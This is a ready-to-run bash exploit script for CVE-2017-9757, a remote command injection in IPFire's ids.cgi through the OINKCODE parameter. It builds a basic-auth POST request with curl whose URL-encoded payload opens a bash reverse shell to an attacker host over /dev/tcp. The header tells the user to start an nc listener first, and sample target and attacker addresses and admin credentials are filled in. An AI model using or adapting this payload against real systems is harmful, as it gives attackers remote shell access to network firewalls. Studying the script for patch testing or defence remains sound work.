#!/bin/bash
#
# IPFire RCE via ids.cgi OINKCODE parameter
#
# vuln software: IPFire version < 2.19 Core Update 110
# vuln id: CVE-2017-9757
#
# Open a listener before executing the exploit
#	nc -nlvp <LPORT>
#
# author: @davimoreno
#

############# PARAMETERS ########################
TARGET="https://172.16.1.100:444/cgi-bin/ids.cgi"
LHOST=172.20.1.175
LPORT=53
USERNAME="admin"
PASSWORD="security"
#################################################

# The payload bellow is the URL encode version of
# `$(which bash) -i > /dev/tcp/${LHOST}/${LPORT} 0>&1 2>&1`
# I recomend using https://www.urldecoder.org/ to URL encode payloads
# Unfortunately, --data-urlencode in curl doesn't properly encode the payload (e.g. spaces are replaced by + instead of %20)
PAYLOAD="%60%24%28which%20bash%29%20-i%20%3E%20%2Fdev%2Ftcp%2F${LHOST}%2F${LPORT}%200%3E%261%202%3E%261%60"

# Put authentication credentials in base64 format
AUTH_BASIC=$(echo -n "$USERNAME:$PASSWORD" | base64 | cut -d ' ' -f 1)

# Get hostname from target
HOST=$(echo -n "$TARGET" | sed -r 's/^(https?:\/\/)?([^\/]+).*$/\2/')

# echo "$TARGET, $HOST, $AUTH_BASIC" # debug

# Send malicious request
curl -k -X POST "$TARGET" \
	-H "Host: $HOST" \
	-H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0" \
	-H "Referer: $TARGET" \
	-H "Content-Type: application/x-www-form-urlencoded" \
	-H "Authorization: Basic $AUTH_BASIC" \
	--data-urlencode "RULES=registered" \
	--data-urlencode "ENABLE_SNORT=on" \
	--data-urlencode "ACTION2=snort" \
	--data-urlencode "ACTION=Download new ruleset" \
	--data-urlencode "ENABLE_SNORT_GREEN=on" \
	--data "OINKCODE=$PAYLOAD"
#		--connect-timeout 10
